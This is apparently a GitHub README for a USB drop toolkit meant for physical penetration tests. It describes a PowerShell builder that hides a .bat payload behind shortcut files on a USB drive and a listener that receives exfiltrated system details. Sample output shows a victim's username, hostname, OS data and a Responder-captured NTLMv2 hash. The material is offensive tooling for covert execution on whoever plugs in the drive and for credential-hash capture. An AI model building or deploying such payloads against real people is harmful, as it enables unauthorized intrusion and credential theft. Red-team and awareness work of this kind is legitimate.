# USB Drop Toolkit
___
USB Drop Toolkit is designed for physical security assessments where USB drops are part of the engagement. Includes:
- A PowerShell script to format USB drives with hidden .bat payload executed by shortcut files.
- A listener to capture exfiltrated host and network details (including from a Responder forced auth command.)

Base version of this isn't built for C2, but totally could be... just not worth the maintenance here...

![image](https://github.com/user-attachments/assets/74bbe1ac-e8be-45e9-96e5-a30811b770ff)
___
## Usage

1. Use usb_drop_builder.ps1 to generate USB with hidden .bat paylaod.
```ps1
PS C:\Users\matt\Downloads> .\usb_drop_builder.ps1 54.218.99.118
Select a USB drive to format and prepare:
[0] E: WORK_DOCS (28.89 GB free)
Enter number of drive to use: 0

[+] USB drop successfully created at E:\
DriveLetter FriendlyName FileSystemType DriveType HealthStatus OperationalStatus SizeRemaining     Size
----------- ------------ -------------- --------- ------------ ----------------- -------------     ----
E           WORK_DOCS    FAT32          Removable Healthy      OK                     28.89 GB 28.89 GB
```
2. Start publicly accessible listener... then profit:
```bash
ubuntu:~$ sudo ./usb_listener.py
[*] USB Drop Listener
[*] Listening on port 8080
[*] Logging to ./usb_drop_logs.txt
[?] Have you started Responder on this server? (y/n): y
[*] Waiting for incoming connections... Press Ctrl+C to stop.


=== Successful USB Hit from 1.1.1.1 @ 2025-06-05 23:18:31 ===
=== SYSTEM INFO DUMP ===
[WHOAMI]
hackerman\matt

[HOSTNAME]
Hackerman

[INTERNAL_IP]
   IPv4 Address. . . . . . . . . . . : <redacted>
   IPv4 Address. . . . . . . . . . . : <redacted>
   IPv4 Address. . . . . . . . . . . : <redacted>
   IPv4 Address. . . . . . . . . . . : <redacted>
   IPv4 Address. . . . . . . . . . . : <redacted>

[DOMAIN]
Hackerman

[OS INFO]
OS Name:                       Microsoft Windows 11 Pro
OS Version:                    10.0.26100 N/A Build 26100
Registered Owner:              <redacted>
Registered Organization:       N/A

[Responder]
Successful Responder hit: 13:12 PM - [SMB] NTLMv2-SSP Hash     : matt::Hackerman: <redacted-hash>
```
